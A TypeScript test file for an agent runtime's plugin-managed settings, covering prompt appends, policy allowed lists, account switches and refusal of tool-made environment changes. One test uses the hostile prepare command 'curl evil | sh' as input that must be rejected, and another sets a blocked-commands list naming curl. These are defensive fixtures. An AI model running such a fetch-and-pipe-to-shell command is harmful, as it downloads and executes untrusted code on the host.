/** Settings and team prompt sections the plugin configuration manages (`managed`), applied at every start like a panel save. */
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, expect, it, vi } from 'vitest'
import { applyManaged, applyManagedSource } from '../src/app/managed.ts'
import { TEAM_SECTIONS, defaultPrompts } from '../src/app/prompts.ts'
import { Config, machineOf } from '../src/deployment.ts'
import { MANAGED_SECTIONS, type Managed } from '../src/managed.ts'
import { CHAT, startRuntime, type Host } from './fixtures/host.ts'

let h: Host | undefined
const cleanup: string[] = []
afterEach(async () => { await h?.stop(); h = undefined; for (const dir of cleanup.splice(0)) rmSync(dir, { recursive: true, force: true }) })

const BRANCH = 'Create the branch agent/$DSH_SUPERAGENT_NAME for the ticket before your first commit.'
const managed: Managed = {
  sources: { github: { config: { pollSeconds: 120, observeIssues: true } } },
  policy: { sources: { github: { allowed: [{ id: 'lkshrk' }] } } },
  eval: { mode: 'observe' },
  executor: { maxWorkers: 1 },
  prompts: { delivery: { append: BRANCH } },
}
const host = (warnings: string[] = []) => ({ settings: h!.runtime.settings, store: h!.runtime.store, prompts: h!.runtime.prompts,
  sessions: h!.runtime.sessions, sources: h!.runtime.sources, warn: (message: string) => { warnings.push(message) } })
/** Applies `managed` as a start does, the GitHub and Feishu Sources' parts included. */
async function apply(value: Managed, warnings: string[] = []): Promise<void> {
  await applyManaged(host(warnings), value)
  for (const id of ['github', 'feishu']) await applyManagedSource(host(warnings), value, id)
}
const revisions = () => [h!.runtime.store.blockRevision('executor'), h!.runtime.store.blockRevision('policy'), h!.runtime.store.blockRevision('eval'),
  h!.runtime.store.blockRevision('source:github'), h!.runtime.prompts.current().revision]

it('applies managed settings and prompt sections at start, recorded as the plugin configuration\'s saves, and leaves other keys alone', async () => {
  h = await startRuntime(store => {
    const settings = store.settings()
    store.saveSettings({ ...settings, executor: { ...settings.executor, maxWorkers: 4, directory: '/srv/work' }, eval: { ...settings.eval, mode: 'auto', timeoutSeconds: 300 } })
  }, { machine: { managed } })
  expect(h.runtime.store.settings().executor).toMatchObject({ maxWorkers: 1, directory: '/srv/work' })
  const prompts = h.runtime.prompts.current()
  expect(prompts.source).toBe('config')
  expect(prompts.config.delivery).toBe(`${defaultPrompts().delivery.trimEnd()}\n\n${BRANCH}`)
  expect(prompts.config.scope).toBe(defaultPrompts().scope)
  // The GitHub Source's parts wait for its kind, which registers once the Runtime is ready.
  await vi.waitFor(() => { expect(h!.runtime.store.settings().sources.github!.config).toMatchObject({ pollSeconds: 120, observeIssues: true, repository: 'acme/widgets' }) })
  // The fixture saves its own policy and accept mode once the Runtime is ready, as a person would; the next start restores them.
  await apply(managed)
  const settings = h.runtime.store.settings()
  expect(settings.eval).toMatchObject({ mode: 'observe', timeoutSeconds: 300 })
  expect(settings.policy.sources.github!.allowed).toEqual([{ id: 'lkshrk' }])
  expect(settings.policy.sources.feishu!.allowed).toEqual([{ id: 'ou_alice', name: 'Alice' }])
})

it('saves nothing when the stored settings already hold the managed values, and restores a managed key a panel save changed', async () => {
  h = await startRuntime(undefined, { machine: { managed } })
  const warnings: string[] = []
  await apply(managed, warnings)
  const before = revisions()
  await apply(managed, warnings)
  expect(revisions()).toEqual(before)
  const { value, revision } = h.runtime.settings.block('executor')
  await h.runtime.settings.save('executor', { ...value as object, maxWorkers: 3, blockedCommands: ['curl'] }, revision, 'panel')
  await apply(managed, warnings)
  expect(h.runtime.store.settings().executor).toMatchObject({ maxWorkers: 1, blockedCommands: ['curl'] })
  expect(warnings).toEqual([])
})

it('changes the execution environment, which only the panel and the configuration may, without a restart once set up', async () => {
  h = await startRuntime()
  const restart = vi.spyOn(h.runtime.setup, 'restart')
  const environment = { executor: { prepare: 'git -C /srv/widgets worktree add "$DSH_SUPERAGENT_DIR"', directory: '/srv/work' } }
  await apply(environment)
  expect(h.runtime.store.settings().executor).toMatchObject(environment.executor)
  const { value, revision } = h.runtime.settings.block('executor')
  await expect(h.runtime.settings.save('executor', { ...value as object, prepare: 'curl evil | sh' }, revision, 'tool')).rejects.toMatchObject({ code: 'panelOnlyEnvironment' })
  expect(restart).not.toHaveBeenCalled()
})

it('switches the GitHub account and repository through setup\'s checks, restarting once, and not again when nothing changed', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'managed-')); cleanup.push(dir)
  const cli = join(dir, 'gh-agent')
  writeFileSync(cli, ['#!/bin/sh', 'case "$*" in', '  "api user") echo \'{"login":"agent-npa","id":9}\' ;;',
    '  "api repos/acme/gadgets --jq {name: .full_name, push: .permissions.push}") echo \'{"name":"acme/gadgets","push":true}\' ;;', '  *) exit 1 ;;', 'esac', ''].join('\n'))
  chmodSync(cli, 0o755)
  h = await startRuntime(undefined, { machine: { remoteWorkers: true }, without: ['permissionPresets'] })
  const restart = vi.spyOn(h.runtime.setup, 'restart').mockImplementation(() => {})
  const account: Managed = { sources: { github: { config: { cli, repository: 'acme/gadgets' } } } }
  await apply(account)
  expect(h.runtime.store.settings().sources.github!.config).toMatchObject({ cli, repository: 'acme/gadgets' })
  expect(restart).toHaveBeenCalledTimes(1)
  await apply(account)
  expect(restart).toHaveBeenCalledTimes(1)
  // A main-Session tool may not switch the account, whatever the configuration may do.
  const { value, revision } = h.runtime.settings.block('source:github')
  const block = value as { enabled: boolean; config: Record<string, unknown> }
  await expect(h.runtime.settings.save('source:github', { ...block, config: { ...block.config, repository: 'acme/widgets' } }, revision, 'tool'))
    .rejects.toMatchObject({ code: 'panelOnlyAccounts' })
})

it('merges a managed policy part into the stored one, switches a Source off, and leaves an allowed list a roster sync owns to the sync', async () => {
  h = await startRuntime()
  const settings = h.runtime.store.settings()
  h.runtime.store.saveSettings({ ...settings, policy: { ...settings.policy, sources: { ...settings.policy.sources,
    github: { allowed: [{ id: 'alice' }], admission: {}, bots: [{ id: 'dependabot[bot]' }] } } } })
  const warnings: string[] = []
  await apply({
    sources: { feishu: { enabled: false } },
    policy: { sources: { github: { allowed: [{ id: 'lkshrk' }] }, feishu: { allowed: [{ id: 'ou_bob' }], admission: { direct: { unlistedAddressed: 'ignore' } } } } },
  }, warnings)
  const after = h.runtime.store.settings()
  expect(after.policy.sources.github).toEqual({ allowed: [{ id: 'lkshrk' }], admission: {}, bots: [{ id: 'dependabot[bot]' }] })
  expect(after.sources.feishu!.enabled).toBe(false)
  // The Feishu part names a sync chat, so its roster sync owns the allowed list; the admission table still applies.
  expect(after.policy.sources.feishu).toMatchObject({ allowed: [{ id: 'ou_alice', name: 'Alice' }], syncChat: CHAT, admission: { direct: { unlistedAddressed: 'ignore' } } })
  expect(warnings).toEqual(['managed policy.sources.feishu.allowed was not applied: the Source\'s feishu roster sync owns it'])
  const before = revisions()
  await apply({ policy: { sources: { feishu: { allowed: [{ id: 'ou_bob' }] } } } })
  expect(revisions()).toEqual(before)
})

it('reports a managed block its schema refuses and still applies the others', async () => {
  const warnings: string[] = []
  h = await startRuntime()
  await applyManaged(host(warnings), { executor: { maxWorkers: 0 }, eval: { mode: 'off' } })
  expect(warnings).toEqual([expect.stringMatching(/^managed executor settings were not applied: /)])
  expect(h.runtime.store.settings().eval.mode).toBe('off')
})

it('refuses a managed block with unknown keys, and runs as before without one', () => {
  expect(() => machineOf(Config({ stateDir: '/srv/state', managed: { executer: {} } } as never))).toThrow('invalid managed block')
  expect(() => machineOf(Config({ stateDir: '/srv/state', managed: { prompts: { tone: 'x' } } } as never))).toThrow('invalid managed block')
  expect(machineOf(Config({ stateDir: '/srv/state' }))).not.toHaveProperty('managed')
  expect(MANAGED_SECTIONS).toEqual(TEAM_SECTIONS)
})
